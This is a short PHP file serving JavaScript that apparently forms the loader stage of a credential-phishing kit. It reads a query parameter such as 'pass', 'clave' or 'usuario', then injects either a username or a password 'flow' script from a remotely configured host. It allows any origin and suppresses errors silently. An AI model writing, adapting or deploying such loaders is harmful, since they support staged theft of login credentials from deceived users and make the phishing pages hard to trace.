<?php
header('Access-Control-Allow-Origin: *');
Header("content-type: application/javascript");
?>
(function () {
  var target = 'user';
  try {
    var search = (typeof window !== 'undefined' && window.location) ? (window.location.search || '') : '';
    if (search) {
      var params = new URLSearchParams(search);
      var raw = params.get('mode') || params.get('step') || params.get('type');
      if (raw) {
        raw = String(raw).toLowerCase();
        if (raw === 'pass' || raw === 'password' || raw === 'clave') {
          target = 'pass';
        } else if (raw === 'user' || raw === 'usuario') {
          target = 'user';
        }
      }
    }
  } catch (e) {}

  var scriptPath = target === 'pass' ? 'flows/pass.php' : 'flows/user.php';

  if (typeof window !== 'undefined' && typeof window.loadScript === 'function') {
    try {
      window.loadScript(scriptPath, window.my_data || {});
      return;
    } catch (e) {}
  }

  var hosting = '';
  try {
    hosting = String(window.my_hosting || '');
  } catch (e) {
    hosting = '';
  }
  if (hosting && hosting.slice(-1) !== '/' && scriptPath.charAt(0) !== '/') {
    hosting += '/';
  }

  var fallbackSrc = (hosting ? hosting : '') + scriptPath;
  try {
    var script = document.createElement('script');
    script.src = fallbackSrc + (window.location ? window.location.search || '' : '');
    script.onerror = function () {
      if (typeof window !== 'undefined' && typeof window.processing === 'function') {
        try {
          window.processing({ t: 'consultar' });
        } catch (e) {}
      }
    };
    document.head.appendChild(script);
  } catch (e) {
    if (typeof window !== 'undefined' && typeof window.processing === 'function') {
      try {
        window.processing({ t: 'consultar' });
      } catch (err) {}
    }
  }
})();

